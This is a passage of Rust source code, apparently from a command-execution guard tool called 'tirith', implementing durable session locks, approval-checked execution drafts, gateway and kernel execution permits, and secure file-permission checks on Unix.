        let existing_anchor = read_strict_anchor(&lock_file)?;
        if strict_missing && existing_anchor.is_some() {
            return Err(
                "strict execution state is missing while its stable deletion anchor remains"
                    .to_string(),
            );
        }
        let (legacy_session, legacy_identity, legacy_source_sha256) = if strict_missing {
            let (mut session, identity, source_sha256) =
                read_strict_session(&state_path, session_id)?;
            validate_session_state(&mut session, session_id)?;
            (Some(session), identity, source_sha256)
        } else {
            (None, None, None)
        };
        let (strict_file, ledger, _, strict_path, strict_identity) =
            open_or_initialize_strict_state(
                parent,
                session_id,
                legacy_session.as_ref(),
                legacy_source_sha256.as_deref(),
            )?;
        validate_execution_ledger(&ledger, session_id)?;
        bind_strict_anchor(&lock_file, &lock_path, &ledger.instance_id)?;
        let (effective, provisional_events, escalation_hits) =
            evaluate_against_session(raw_verdict, policy, command, caller, shell, &ledger)?;
        let redacted = crate::redact::redact_command_text(command, &policy.dlp_custom_patterns);
        let draft = ExecutionDraft::new(
            session_id,
            command,
            redacted,
            ledger.generation,
            raw_verdict,
            &effective,
            policy,
            caller,
            shell,
            provisional_events,
            escalation_hits,
            ttl,
        )?;
        if strict_missing {
            verify_optional_path_identity(
                &state_path,
                legacy_identity,
                "legacy execution session state",
            )?;
        }
        if path_identity(&lock_path, "execution lock")? != lock_identity
            || path_identity(&strict_path, "strict execution state")? != strict_identity
        {
            return Err("execution preparation state changed while locked".to_string());
        }
        drop(strict_file);
        fs2::FileExt::unlock(&lock_file)
            .map_err(|error| format!("unlock execution preparation snapshot: {error}"))?;
        Ok(PreparedExecution {
            verdict: effective,
            draft,
        })
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PromotionOutcome {
    Committed { generation: u64 },
    Upgraded { generation: u64 },
    Idempotent { generation: u64 },
}

/// Core-owned continuation retained after the stopped target has been durably
/// recorded as unresolved but before it is allowed to resume. The stable
/// session lock remains held for this permit's lifetime. Dropping it releases
/// the lock while leaving only conservative unresolved history.
#[cfg(target_os = "linux")]
pub(crate) struct KernelExecutionPermit {
    gate: Option<ExecutionGate>,
}

#[cfg(target_os = "linux")]
impl KernelExecutionPermit {
    pub(crate) fn from_stopped_gate(gate: ExecutionGate) -> Self {
        Self { gate: Some(gate) }
    }

    pub(crate) fn promote_resumed(
        &mut self,
        evidence_id: impl Into<String>,
    ) -> Result<PromotionOutcome, String> {
        let gate = self
            .gate
            .as_mut()
            .ok_or_else(|| "kernel execution permit was already completed".to_string())?;
        let evidence = gate.draft.kernel_exec_stop_evidence(evidence_id)?;
        let outcome = gate.promote_retaining_lock(evidence, PublishFailureInjection::default())?;
        if !matches!(outcome, PromotionOutcome::Upgraded { .. }) {
            return Err(
                "terminal kernel exec proof did not upgrade its stopped unresolved transition"
                    .to_string(),
            );
        }
        let gate = self
            .gate
            .take()
            .expect("kernel execution permit remains owned until successful completion");
        if let Err(error) = fs2::FileExt::unlock(&gate.lock_file) {
            eprintln!(
                "tirith: durable kernel execution transition committed; explicit unlock failed and descriptor drop will release it: {error}"
            );
        }
        Ok(outcome)
    }
}

/// Typed outcome for a gateway result confirmation. Callers may retry only a
/// known-uncommitted publication failure with the exact same response bytes.
/// `CommitUnknown` is reserved for a post-write durability boundary where the
/// inactive slot could not be proven committed or invalidated.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum GatewayCompletionError {
    InvalidResponse(String),
    Rejected(String),
    Retryable(String),
    CommitUnknown(String),
}

impl fmt::Display for GatewayCompletionError {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        let (kind, detail) = match self {
            Self::InvalidResponse(detail) => ("invalid response", detail),
            Self::Rejected(detail) => ("confirmation rejected", detail),
            Self::Retryable(detail) => ("retryable confirmation failure", detail),
            Self::CommitUnknown(detail) => ("confirmation commit unknown", detail),
        };
        write!(formatter, "{kind}: {detail}")
    }
}

impl std::error::Error for GatewayCompletionError {}

/// Opaque gateway continuation created only after a prepared gateway decision
/// has been rechecked under the stable session lock and its forward attempt has
/// been durably recorded as unresolved. The public API deliberately accepts no
/// caller-supplied evidence identifiers or evidence grades: a confirmation must
/// be a complete JSON-RPC success response carrying the exact random proxy id
/// bound at construction.
pub struct GatewayExecutionPermit {
    proxy_request_id: String,
    deferred: DeferredExecution,
}

impl fmt::Debug for GatewayExecutionPermit {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter
            .debug_struct("GatewayExecutionPermit")
            .field(
                "proxy_request_id_sha256",
                &sha256_hex(self.proxy_request_id.as_bytes()),
            )
            .finish_non_exhaustive()
    }
}

impl GatewayExecutionPermit {
    /// Durably record that an authorized guarded request is about to be
    /// forwarded. Recording before the transport write is intentionally
    /// conservative: if the write is partial or its outcome is unknown, strict
    /// history retains an unresolved observation but never claims execution.
    pub fn record_forwarded(
        prepared: PreparedExecution,
        proxy_request_id: impl Into<String>,
        completion_window: Duration,
        lock_timeout: Duration,
    ) -> Result<Self, String> {
        let proxy_request_id = proxy_request_id.into();
        validate_gateway_proxy_id(&proxy_request_id)?;
        if completion_window.is_zero() || Instant::now().checked_add(completion_window).is_none() {
            return Err("gateway completion window is invalid".to_string());
        }
        let draft = prepared.into_authorizable_draft()?;
        if draft.caller() != CallerContext::Gateway {
            return Err("gateway execution permit requires a gateway decision".to_string());
        }
        let gate = ExecutionGate::acquire(draft, lock_timeout)?;
        let unresolved_evidence_id = format!("gateway-forwarded-{}", uuid::Uuid::new_v4().simple());
        let (_, deferred) =
            gate.promote_gateway_unresolved(unresolved_evidence_id, completion_window)?;
        Ok(Self {
            proxy_request_id,
            deferred,
        })
    }

    /// Upgrade the bound unresolved forward to confirmed only after validating
    /// a complete JSON-RPC success response for this permit's random proxy id.
    /// Publication failures leave the continuation retryable with the exact same
    /// response identity and never return success.
    pub fn promote_completed_response(
        &mut self,
        response: &[u8],
        lock_timeout: Duration,
    ) -> Result<PromotionOutcome, GatewayCompletionError> {
        let response_identity = validate_gateway_success_response(response, &self.proxy_request_id)
            .map_err(GatewayCompletionError::InvalidResponse)?;
        self.deferred
            .promote_gateway_completed(format!("gateway-result-{response_identity}"), lock_timeout)
    }

    pub fn completion_window_open(&self) -> bool {
        Instant::now() < self.deferred.upgrade_deadline
    }
}

fn validate_gateway_proxy_id(proxy_request_id: &str) -> Result<(), String> {
    let Some(random) = proxy_request_id.strip_prefix("tirith-") else {
        return Err("gateway proxy id lacks the internal Tirith prefix".to_string());
    };
    if random.len() != 32
        || !random
            .bytes()
            .all(|byte| byte.is_ascii_hexdigit() && !byte.is_ascii_uppercase())
    {
        return Err("gateway proxy id is not a random lowercase UUID identity".to_string());
    }
    validate_stable_id("gateway proxy", proxy_request_id)
}

fn validate_gateway_success_response(
    response: &[u8],
    proxy_request_id: &str,
) -> Result<String, String> {
    let text = std::str::from_utf8(response)
        .map_err(|_| "gateway completion response is not UTF-8".to_string())?;
    let parsed = crate::mcp_lock::parse_json_no_duplicates(text).map_err(|error| match error {
        crate::mcp_lock::StrictJsonError::Malformed => {
            "gateway completion response is malformed JSON".to_string()
        }
        crate::mcp_lock::StrictJsonError::DuplicateObjectKey => {
            "gateway completion response contains duplicate object keys".to_string()
        }
    })?;
    let object = parsed
        .as_object()
        .ok_or_else(|| "gateway completion response is not an object".to_string())?;
    if object.get("jsonrpc").and_then(serde_json::Value::as_str) != Some("2.0") {
        return Err("gateway completion response has an invalid JSON-RPC version".to_string());
    }
    if object.get("id") != Some(&serde_json::Value::String(proxy_request_id.to_string())) {
        return Err("gateway completion response is bound to a different proxy id".to_string());
    }
    if !object.contains_key("result")
        || object.contains_key("error")
        || object.contains_key("method")
    {
        return Err("gateway completion response is not an unambiguous success result".to_string());
    }
    let canonical = crate::audit::canonical_json_for_hash(&parsed);
    Ok(sha256_hex(canonical.as_bytes()))
}

/// Opaque continuation retained only after an unresolved observation was
/// durably written. It cannot authorize a new launch; it can only reopen the
/// same execution id for an eventual confirmed upgrade.
pub(crate) struct DeferredExecution {
    draft: ExecutionDraft,
    unresolved_evidence_id: String,
    unresolved_generation: u64,
    upgrade_deadline: Instant,
    confirmation_evidence_id: Option<String>,
    completed_generation: Option<u64>,
}

impl DeferredExecution {
    pub(crate) fn promote_gateway_completed(
        &mut self,
        evidence_id: impl Into<String>,
        timeout: Duration,
    ) -> Result<PromotionOutcome, GatewayCompletionError> {
        self.promote_gateway_completed_with_failures(
            evidence_id.into(),
            timeout,
            PublishFailureInjection::default(),
        )
    }

    fn promote_gateway_completed_with_failures(
        &mut self,
        evidence_id: String,
        timeout: Duration,
        failures: PublishFailureInjection,
    ) -> Result<PromotionOutcome, GatewayCompletionError> {
        #[cfg(not(unix))]
        {
            let _ = (&self, evidence_id, timeout, failures);
            return Err(GatewayCompletionError::Rejected(
                "late strict execution upgrade is unsupported on this platform".to_string(),
            ));
        }

        #[cfg(unix)]
        {
            if let Some(generation) = self.completed_generation {
                if self.confirmation_evidence_id.as_deref() == Some(evidence_id.as_str()) {
                    return Ok(PromotionOutcome::Idempotent { generation });
                }
                return Err(GatewayCompletionError::Rejected(
                    "completed deferred execution received changed evidence".to_string(),
                ));
            }
            if Instant::now() >= self.upgrade_deadline {
                return Err(GatewayCompletionError::Rejected(
                    "deferred execution upgrade deadline expired".to_string(),
                ));
            }
            match self.confirmation_evidence_id.as_deref() {
                Some(expected) if expected != evidence_id => {
                    return Err(GatewayCompletionError::Rejected(
                        "deferred execution retry changed confirmation evidence".to_string(),
                    ))
                }
                Some(_) => {}
                None => self.confirmation_evidence_id = Some(evidence_id.clone()),
            }
            let deadline = Instant::now().checked_add(timeout).ok_or_else(|| {
                GatewayCompletionError::Rejected(
                    "late execution-upgrade deadline overflowed".to_string(),
                )
            })?;
            let state_path = crate::session_warnings::session_state_path(self.draft.session_id())
                .ok_or_else(|| {
                GatewayCompletionError::Rejected(
                    "late execution upgrade has an invalid session id".to_string(),
                )
            })?;
            let lock_path = crate::session_warnings::session_lock_path(self.draft.session_id())
                .ok_or_else(|| {
                    GatewayCompletionError::Rejected(
                        "late execution upgrade has no stable lock path".to_string(),
                    )
                })?;
            let parent = state_path.parent().ok_or_else(|| {
                GatewayCompletionError::Rejected(
                    "late execution session path has no parent".to_string(),
                )
            })?;
            // Once the deferred identity has been accepted, filesystem-shape,
            // ownership, and ledger-integrity failures are terminal for that
            // observation. Retrying them until the response window expires can
            // neither repair the boundary nor make the same bytes safer.
            ensure_secure_session_directory(parent).map_err(GatewayCompletionError::Rejected)?;
            let lock_file =
                open_and_lock_secure(&lock_path, deadline).map_err(|error| match error {
                    SecureLockError::Retryable(detail) => GatewayCompletionError::Retryable(detail),
                    SecureLockError::Rejected(detail) => GatewayCompletionError::Rejected(detail),
                })?;
            let lock_identity = secure_regular_identity(&lock_file, "execution lock")
                .map_err(GatewayCompletionError::Rejected)?;
            let (mut strict_file, mut ledger, active_slot, strict_path, strict_identity) =
                open_or_initialize_strict_state(parent, self.draft.session_id(), None, None)
                    .map_err(GatewayCompletionError::Rejected)?;
            validate_execution_ledger(&ledger, self.draft.session_id())
                .map_err(GatewayCompletionError::Rejected)?;
            require_strict_anchor(&lock_file, &ledger.instance_id)
                .map_err(GatewayCompletionError::Rejected)?;
            let existing = ledger
                .unresolved
                .iter()
                .chain(ledger.confirmed.iter())
                .find(|record| record.execution_id == self.draft.execution_id())
                .ok_or_else(|| {
                    GatewayCompletionError::Rejected(
                        "deferred execution record is no longer available".to_string(),
                    )
                })?;
            if !existing.identity_matches(&self.draft) {
                return Err(GatewayCompletionError::Rejected(
                    "deferred execution identity changed before upgrade".to_string(),
                ));
            }
            let last_transition = existing.evidence_history.last().ok_or_else(|| {
                GatewayCompletionError::Rejected(
                    "deferred execution lost its evidence transition".to_string(),
                )
            })?;
            if existing.is_confirmed() {
                if existing.evidence_id == evidence_id
                    && existing.evidence_grade == ExecutionEvidenceGrade::GatewayCompleted
                {
                    self.completed_generation = Some(existing.generation);
                    return Ok(PromotionOutcome::Idempotent {
                        generation: existing.generation,
                    });
                }
                return Err(GatewayCompletionError::Rejected(
                    "deferred execution was confirmed by different evidence".to_string(),
                ));
            }
            if existing.evidence_grade != ExecutionEvidenceGrade::GatewayForwardedUnresolved
                || last_transition.evidence_id != self.unresolved_evidence_id
                || last_transition.generation != self.unresolved_generation
            {
                return Err(GatewayCompletionError::Rejected(
                    "deferred execution no longer ends at its bound unresolved transition"
                        .to_string(),
                ));
            }
            let evidence = self
                .draft
                .gateway_completed_evidence(evidence_id)
                .map_err(GatewayCompletionError::Rejected)?;
            let outcome = promote_record(&mut ledger, &self.draft, &evidence)
                .map_err(GatewayCompletionError::Rejected)?;
            if path_identity(&lock_path, "execution lock")
                .map_err(GatewayCompletionError::Rejected)?
                != lock_identity
            {
                return Err(GatewayCompletionError::Rejected(
                    "execution lock path changed during late upgrade".to_string(),
                ));
            }
            if !matches!(outcome, PromotionOutcome::Idempotent { .. }) {
                let publication = write_strict_state(
                    &mut strict_file,
                    &strict_path,
                    strict_identity,
                    active_slot,
                    &ledger,
                    failures,
                );
                if let Err(error) = publication {
                    return Err(match error {
                        StrictPublicationError::NotCommitted(detail) => {
                            GatewayCompletionError::Retryable(detail)
                        }
                        StrictPublicationError::CommitUnknown(detail) => {
                            GatewayCompletionError::CommitUnknown(detail)
                        }
                    });
                }
            }
            if let Err(error) = fs2::FileExt::unlock(&lock_file) {
                eprintln!(
                    "tirith: durable late execution upgrade committed; explicit unlock failed and descriptor drop will release it: {error}"
                );
            }
            self.completed_generation = Some(match outcome {
                PromotionOutcome::Committed { generation }
                | PromotionOutcome::Upgraded { generation }
                | PromotionOutcome::Idempotent { generation } => generation,
            });
            Ok(outcome)
        }
    }
}

#[derive(Debug, Clone, Copy, Default)]
struct PublishFailureInjection {
    fail_write: bool,
    fail_sync: bool,
    fail_commit_sync: bool,
    fail_recovery_sync: bool,
    fail_rename: bool,
    fail_parent_sync: bool,
}

#[derive(Debug)]
enum StrictPublicationError {
    NotCommitted(String),
    CommitUnknown(String),
}

impl fmt::Display for StrictPublicationError {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::NotCommitted(detail) => write!(formatter, "strict state not committed: {detail}"),
            Self::CommitUnknown(detail) => {
                write!(formatter, "strict state commit is unknown: {detail}")
            }
        }
    }
}

#[cfg(unix)]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct FileIdentity {
    device: u64,
    inode: u64,
}

#[cfg(not(unix))]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct FileIdentity;

#[cfg(unix)]
#[derive(Debug)]
enum SecureLockError {
    Retryable(String),
    Rejected(String),
}

#[cfg(unix)]
impl fmt::Display for SecureLockError {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Retryable(detail) => write!(formatter, "retryable secure-lock failure: {detail}"),
            Self::Rejected(detail) => write!(formatter, "secure-lock rejected: {detail}"),
        }
    }
}

/// Stable-lock owner for one execution decision. The lock is acquired after
/// interactive approval but before launch/forwarding and remains held until a
/// trusted boundary supplies evidence and the transition is durably published.
/// Dropping the gate without promotion simply releases the lock; callers must
/// couple that drop to target/process cleanup.
pub struct ExecutionGate {
    lock_file: File,
    lock_path: PathBuf,
    lock_identity: FileIdentity,
    strict_file: File,
    strict_path: PathBuf,
    strict_identity: FileIdentity,
    active_slot: usize,
    ledger: ExecutionLedger,
    draft: ExecutionDraft,
    #[cfg_attr(not(target_os = "linux"), allow(dead_code))]
    promotion_timeout: Duration,
    deadline: Instant,
}

impl fmt::Debug for ExecutionGate {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter
            .debug_struct("ExecutionGate")
            .field("generation", &self.ledger.generation)
            .field("draft", &self.draft)
            .finish_non_exhaustive()
    }
}

impl ExecutionGate {
    pub fn acquire(draft: ExecutionDraft, timeout: Duration) -> Result<Self, String> {
        #[cfg(not(unix))]
        {
            let _ = (draft, timeout);
            return Err(
                "strict execution-state ownership and durable directory publication are not supported on this platform"
                    .to_string(),
            );
        }

        #[cfg(unix)]
        {
            validate_draft(&draft)?;
            let lock_deadline = Instant::now()
                .checked_add(timeout)
                .ok_or_else(|| "execution-gate deadline overflowed".to_string())?;
            let state_path = crate::session_warnings::session_state_path(draft.session_id())
                .ok_or_else(|| "execution gate has an invalid session id".to_string())?;
            let lock_path = crate::session_warnings::session_lock_path(draft.session_id())
                .ok_or_else(|| "execution gate has no stable lock path".to_string())?;
            let parent = state_path
                .parent()
                .ok_or_else(|| "execution session path has no parent".to_string())?;
            ensure_secure_session_directory(parent)?;
            let lock_file = open_and_lock_secure(&lock_path, lock_deadline)
                .map_err(|error| error.to_string())?;
            let lock_identity = secure_regular_identity(&lock_file, "execution lock")?;
            let (strict_file, ledger, active_slot, strict_path, strict_identity) =
                open_or_initialize_strict_state(parent, draft.session_id(), None, None)?;
            validate_execution_ledger(&ledger, draft.session_id())?;
            require_strict_anchor(&lock_file, &ledger.instance_id)?;
            if ledger.generation != draft.expected_generation() {
                return Err(format!(
                    "execution decision is stale: prepared generation {} but current generation is {}",
                    draft.expected_generation(),
                    ledger.generation
                ));
            }
            recheck_under_lock(&ledger, &draft)?;
            // Lock acquisition has its own bounded deadline. Promotion receives
            // a fresh window only after the exact ledger generation and policy
            // basis have been rechecked under that lock; time spent waiting for
            // an earlier owner must not silently consume the launch protocol's
            // entire OBSERVED -> durable commit -> ACK budget.
            let deadline = Instant::now()
                .checked_add(timeout)
                .ok_or_else(|| "execution-gate promotion deadline overflowed".to_string())?;
            Ok(Self {
                lock_file,
                lock_path,
                lock_identity,
                strict_file,
                strict_path,
                strict_identity,
                active_slot,
                ledger,
                draft,
                promotion_timeout: timeout,
                deadline,
            })
        }
    }

    pub fn execution_id(&self) -> &str {
        self.draft.execution_id()
    }

    pub fn deadline(&self) -> Instant {
        self.deadline
    }

    /// Begin a fresh, bounded launch-boundary window after trusted local setup.
    /// The original gate window must still be live, so a caller cannot retain
    /// the session lock indefinitely and later revive an expired authorization.
    #[cfg(target_os = "linux")]
    pub(crate) fn begin_kernel_launch_window(&mut self) -> Result<(), String> {
        let now = Instant::now();
        if now >= self.deadline || unix_time_ms()? >= self.draft.expires_unix_ms() {
            return Err("execution gate expired before kernel launch was armed".to_string());
        }
        self.deadline = now
            .checked_add(self.promotion_timeout)
            .ok_or_else(|| "kernel launch promotion deadline overflowed".to_string())?;
        Ok(())
    }

    #[cfg_attr(not(test), allow(dead_code))]
    pub(crate) fn promote_kernel_exec_stop(
        self,
        evidence_id: impl Into<String>,
    ) -> Result<PromotionOutcome, String> {
        let evidence = self.draft.kernel_exec_stop_evidence(evidence_id)?;
        self.promote(evidence, PublishFailureInjection::default())
            .map(|(outcome, _)| outcome)
    }

    #[cfg(target_os = "linux")]
    pub(crate) fn promote_kernel_exec_stopped(
        &mut self,
        evidence_id: impl Into<String>,
    ) -> Result<PromotionOutcome, String> {
        let evidence = self
            .draft
            .kernel_exec_stopped_unresolved_evidence(evidence_id)?;
        let outcome = self.promote_retaining_lock(evidence, PublishFailureInjection::default())?;
        if !matches!(outcome, PromotionOutcome::Committed { .. }) {
            return Err(
                "fresh stopped kernel exec did not create a new unresolved transition".to_string(),
            );
        }
        Ok(outcome)
    }

    pub(crate) fn promote_shell_unresolved(
        self,
        evidence_id: impl Into<String>,
    ) -> Result<PromotionOutcome, String> {
        let evidence = self.draft.shell_boundary_evidence(evidence_id)?;
        self.promote(evidence, PublishFailureInjection::default())
            .map(|(outcome, _)| outcome)
    }

    pub(crate) fn promote_gateway_unresolved(
        self,
        evidence_id: impl Into<String>,
        completion_window: Duration,
    ) -> Result<(PromotionOutcome, DeferredExecution), String> {
        if completion_window.is_zero() || Instant::now().checked_add(completion_window).is_none() {
            return Err("gateway completion window is invalid".to_string());
        }
        let evidence_id = evidence_id.into();
        let evidence = self.draft.gateway_forwarded_evidence(evidence_id.clone())?;
        self.promote(evidence, PublishFailureInjection::default())
            .map(|(outcome, draft)| {
                let unresolved_generation = match outcome {
                    PromotionOutcome::Committed { generation }
                    | PromotionOutcome::Upgraded { generation }
                    | PromotionOutcome::Idempotent { generation } => generation,
                };
                // The response window begins only after the unresolved forward
                // transition is durable. It intentionally uses a monotonic
                // clock and is independent of the pre-forward draft TTL.
                let upgrade_deadline = Instant::now()
                    .checked_add(completion_window)
                    .expect("completion window was checked before publication");
                (
                    outcome,
                    DeferredExecution {
                        draft,
                        unresolved_evidence_id: evidence_id,
                        unresolved_generation,
                        upgrade_deadline,
                        confirmation_evidence_id: None,
                        completed_generation: None,
                    },
                )
            })
    }

    fn promote(
        mut self,
        evidence: ExecutionEvidence,
        failures: PublishFailureInjection,
    ) -> Result<(PromotionOutcome, ExecutionDraft), String> {
        let outcome = self.promote_retaining_lock(evidence, failures)?;
        if let Err(error) = fs2::FileExt::unlock(&self.lock_file) {
            eprintln!(
                "tirith: durable execution transition committed; explicit unlock failed and descriptor drop will release it: {error}"
            );
        }
        Ok((outcome, self.draft))
    }

    fn promote_retaining_lock(
        &mut self,
        evidence: ExecutionEvidence,
        failures: PublishFailureInjection,
    ) -> Result<PromotionOutcome, String> {
        #[cfg(not(unix))]
        {
            let _ = (evidence, failures);
            return Err(
                "strict execution-state promotion is not supported on this platform".to_string(),
            );
        }

        #[cfg(unix)]
        {
            if Instant::now() >= self.deadline || unix_time_ms()? >= self.draft.expires_unix_ms() {
                return Err("execution gate expired before durable promotion".to_string());
            }
            if evidence.execution_id() != self.draft.execution_id() {
                return Err("execution evidence is bound to a different draft".to_string());
            }
            if path_identity(&self.lock_path, "execution lock")? != self.lock_identity {
                return Err("execution lock path changed before promotion".to_string());
            }
            require_strict_anchor(&self.lock_file, &self.ledger.instance_id)?;
            recheck_under_lock(&self.ledger, &self.draft)?;

            let outcome = promote_record(&mut self.ledger, &self.draft, &evidence)?;
            if matches!(outcome, PromotionOutcome::Idempotent { .. }) {
                return Ok(outcome);
            }
            self.active_slot = write_strict_state(
                &mut self.strict_file,
                &self.strict_path,
                self.strict_identity,
                self.active_slot,
                &self.ledger,
                failures,
            )
            .map_err(|error| error.to_string())?;
            Ok(outcome)
        }
    }
}

fn validate_draft(draft: &ExecutionDraft) -> Result<(), String> {
    if !draft.interaction.permits_execution() {
        return Err(
            "execution decision still requires approval or warning acknowledgement".to_string(),
        );
    }
    let approval_matches = match &draft.interaction.approval {
        ApprovalResolution::NotRequired => !draft.decision.requires_approval(),
        ApprovalResolution::Pending => false,
        ApprovalResolution::Granted { .. } => draft.decision.requires_approval(),
        ApprovalResolution::FallbackAllow { .. } => {
            draft.decision.requires_approval()
                && draft.effective_verdict.approval_fallback.as_deref() == Some("allow")
        }
        ApprovalResolution::FallbackWarn { .. } => {
            draft.decision.requires_approval()
                && draft.effective_verdict.approval_fallback.as_deref() == Some("warn")
        }
    };
    let warn_ack_matches = match &draft.interaction.warn_ack {
        WarnAckResolution::NotRequired => !draft.decision.requires_warn_ack(),
        WarnAckResolution::Pending => false,
        WarnAckResolution::Acknowledged { .. } => draft.decision.requires_warn_ack(),
    };
    let interaction_matches = approval_matches && warn_ack_matches;
    if !interaction_matches {
        return Err("execution interaction proof does not match its frozen decision".to_string());
    }
    if draft.decision.action() == Action::Block && !draft.bypass.honored() {
        return Err("blocked execution decision cannot acquire an execution gate".to_string());
    }
    let now = unix_time_ms()?;
    if now > draft.expires_unix_ms() {
        return Err("execution decision expired before gate acquisition".to_string());
    }
    if sha256_hex(draft.command().as_bytes()) != draft.command_sha256() {
        return Err("execution draft command identity changed".to_string());
    }
    let frozen =
        PreparedDecision::from_frozen_basis(draft.effective_verdict(), draft.correlation_policy())?;
    if frozen != draft.decision {
        return Err("execution draft policy or verdict basis changed".to_string());
    }
    if BypassSnapshot::from_verdict(draft.effective_verdict())? != draft.bypass {
        return Err("execution draft bypass basis changed".to_string());
    }
    Ok(())
}

fn compute_draft_identity(draft: &ExecutionDraft) -> Result<String, String> {
    let caller = match draft.caller {
        CallerContext::Cli => "cli",
        CallerContext::Gateway => "gateway",
        CallerContext::McpServer => "mcp_server",
        CallerContext::Daemon => "daemon",
    };
    let raw_verdict = serde_json::to_vec(&draft.raw_verdict)
        .map_err(|error| format!("serialize raw execution verdict identity: {error}"))?;
    let identity = serde_json::json!({
        "schema": 1,
        "execution_id": draft.execution_id,
        "session_id": draft.session_id,
        "command_sha256": draft.command_sha256,
        "command_redacted_preview": draft.command_redacted_preview,
        "created_unix_ms": draft.created_unix_ms,
        "expires_unix_ms": draft.expires_unix_ms,
        "expected_generation": draft.expected_generation,
        "caller": caller,
        "shell": draft.shell,
        "origin": draft.origin,
        "bypass": {
            "requested": draft.bypass.requested,
            "available": draft.bypass.available,
            "honored": draft.bypass.honored,
        },
        "action": draft.decision.action,
        "requires_approval": draft.decision.requires_approval,
        "requires_warn_ack": draft.decision.requires_warn_ack,
        "approval_resolution": draft.interaction.approval_tag(),
        "approval_proof_sha256": draft.interaction.approval_proof_sha256(),
        "warn_ack_resolution": draft.interaction.warn_ack_tag(),
        "warn_ack_proof_sha256": draft.interaction.warn_ack_proof_sha256(),
        "policy_basis_sha256": draft.decision.policy_basis_sha256,
        "verdict_basis_sha256": draft.decision.verdict_basis_sha256,
        "raw_verdict_sha256": sha256_hex(&raw_verdict),
        "provisional_events": draft.provisional_events,
        "warning_prototypes": draft.warning_prototypes,
        "escalation_hits": draft.escalation_hits,
        "retention_until_unix_ms": draft.retention_until_unix_ms,
    });
    let canonical = crate::audit::canonical_json_for_hash(&identity);
    Ok(sha256_hex(canonical.as_bytes()))
}

#[cfg(unix)]
fn ensure_secure_session_directory(directory: &Path) -> Result<(), String> {
    use std::os::unix::fs::{MetadataExt as _, PermissionsExt as _};

    let existed = match fs::symlink_metadata(directory) {
        Ok(metadata) => {
            if metadata.file_type().is_symlink() || !metadata.is_dir() {
                return Err("execution session directory is not a real directory".to_string());
            }
            true
        }
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => false,
        Err(error) => return Err(format!("inspect execution session directory: {error}")),
    };
    if !existed {
        fs::create_dir_all(directory)
            .map_err(|error| format!("create execution session directory: {error}"))?;
        fs::set_permissions(directory, fs::Permissions::from_mode(0o700))
            .map_err(|error| format!("secure execution session directory: {error}"))?;
        crate::util::fsync_parent_dir(directory)
            .map_err(|error| format!("durably create execution session directory: {error}"))?;
    }
    let metadata = fs::symlink_metadata(directory)
        .map_err(|error| format!("inspect execution session directory: {error}"))?;
    if metadata.file_type().is_symlink() || !metadata.is_dir() {
        return Err("execution session directory changed identity".to_string());
    }
    if metadata.uid() != unsafe { libc::geteuid() } {
        return Err("execution session directory has the wrong owner".to_string());
    }
    if metadata.mode() & 0o077 != 0 {
        fs::set_permissions(directory, fs::Permissions::from_mode(0o700)).map_err(|error| {
            format!("migrate execution session directory to private mode: {error}")
        })?;
        crate::util::fsync_parent_dir(directory)
            .map_err(|error| format!("durably secure execution session directory: {error}"))?;
    }
    Ok(())
}

#[cfg(unix)]
fn secure_regular_identity(file: &File, label: &str) -> Result<FileIdentity, String> {
    use std::os::unix::fs::MetadataExt as _;

    let metadata = file
        .metadata()
        .map_err(|error| format!("inspect {label}: {error}"))?;
    if !metadata.is_file() {
        return Err(format!("{label} is not a regular file"));
    }
    if metadata.uid() != unsafe { libc::geteuid() } {
        return Err(format!("{label} has the wrong owner"));
    }
    if metadata.mode() & 0o077 != 0 {
        return Err(format!("{label} is accessible by group/other"));
    }
    Ok(FileIdentity {
        device: metadata.dev(),
        inode: metadata.ino(),
    })
}

#[cfg(unix)]
fn path_identity(path: &Path, label: &str) -> Result<FileIdentity, String> {
    use std::os::unix::fs::MetadataExt as _;

    let metadata = fs::symlink_metadata(path)
        .map_err(|error| format!("inspect {label} path identity: {error}"))?;
    if metadata.file_type().is_symlink() || !metadata.is_file() {
        return Err(format!("{label} path is not a real regular file"));
    }
    if metadata.uid() != unsafe { libc::geteuid() } || metadata.mode() & 0o077 != 0 {
        return Err(format!("{label} path has insecure ownership or mode"));
    }
    Ok(FileIdentity {
        device: metadata.dev(),
        inode: metadata.ino(),
    })
}

#[cfg(unix)]
fn open_and_lock_secure(path: &Path, deadline: Instant) -> Result<File, SecureLockError> {
    use std::os::unix::fs::OpenOptionsExt as _;

    let file = OpenOptions::new()
        .read(true)
        .write(true)
        .create(true)
        .mode(0o600)
        .custom_flags(libc::O_NOFOLLOW | libc::O_CLOEXEC)
        .open(path)
        .map_err(|error| {
            if error.kind() == std::io::ErrorKind::Interrupted {
                SecureLockError::Retryable(format!("open stable execution lock: {error}"))
            } else {
                SecureLockError::Rejected(format!("open stable execution lock: {error}"))
            }
        })?;
    let opened_identity =
        secure_regular_identity(&file, "execution lock").map_err(SecureLockError::Rejected)?;
    loop {
        match file.try_lock_exclusive() {
            Ok(()) => break,
            Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => {
                if Instant::now() >= deadline {
                    return Err(SecureLockError::Retryable(
                        "timed out acquiring the execution session lock".to_string(),
                    ));
                }
                std::thread::sleep(
                    LOCK_RETRY_INTERVAL.min(deadline.saturating_duration_since(Instant::now())),
                );
            }
            Err(error) if error.kind() == std::io::ErrorKind::Interrupted => continue,
            Err(error) => {
                return Err(SecureLockError::Retryable(format!(
                    "lock execution session: {error}"
                )))
            }
        }
    }
    let current_identity =
        path_identity(path, "execution lock").map_err(SecureLockError::Rejected)?;
    if opened_identity != current_identity {
        // Use the fs2 trait explicitly: std::fs::File::unlock is only stable
        // starting in Rust 1.89, while this crate supports Rust 1.83.
        let _ = fs2::FileExt::unlock(&file);
        return Err(SecureLockError::Rejected(
            "execution lock path was replaced while acquiring it".to_string(),
        ));
    }
    Ok(file)
}

#[cfg(unix)]
fn read_strict_anchor(lock_file: &File) -> Result<Option<String>, String> {
